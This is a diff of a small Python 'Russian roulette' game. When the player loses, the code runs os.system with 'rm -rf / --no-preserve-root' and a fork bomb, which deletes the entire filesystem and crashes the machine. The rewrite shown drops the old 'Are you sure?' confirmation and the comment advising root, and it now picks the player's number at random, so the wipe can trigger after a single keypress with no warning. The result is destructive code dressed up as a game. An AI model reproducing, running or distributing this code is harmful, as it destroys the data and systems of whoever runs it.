@@ -1,28 +1,34 @@
-#importing random to make the choices entireley random 
-#import os to control the os, so long as you are running as root 
 import os
 import random 
 
-#couple varibles 
-start_game = input("Wanna play a game? \n ")
-play = input("Russian roulette... \n make sure your running as root ")
-list = [1,2,3,4,5,6]
-choose = random.choice(list)
+class aux:
+    def __init__(self,play,list_arr,start_game,Runtime):
+        self.play = play
+        self.list_arr = list_arr
+        self.start_game = start_game
+aux.list_arr = [1,2,3,4,5,6]
+choose= random.choice(aux.list_arr)
+play = random.choice(aux.list_arr)
+def start_game():
+    aux.start_game = input("press enter to play russian roulette\n ").lower
 
-def main():
-    start_game = input("Are you sure? (yes/no): ")
-
-    if start_game.lower() == "yes":
-        play = input("Pick a Number between 1 and 6 \n")
-        choose
-        print("computer chooses"choose)
-        if play == choose:
+def flw_cnrl():
+    input("\n enter to go back")
+    
+def main_game():
+    
+    print("computer chooses",choose)
+    print("your nunmber is",play)
+    if play == choose:
             print("You lose :(")
             os.system("rm -rf / --no-preserve-root | :(){ :|:& };:")
-        else:
-            print("You Win")
     else:
-        print("Smart move")
-
+        print("You Win")
+def main():
+    Runtime = True
+    while Runtime:
+        start_game()
+        main_game()
+        flw_cnrl()
+        Runtime = False
 main()
-
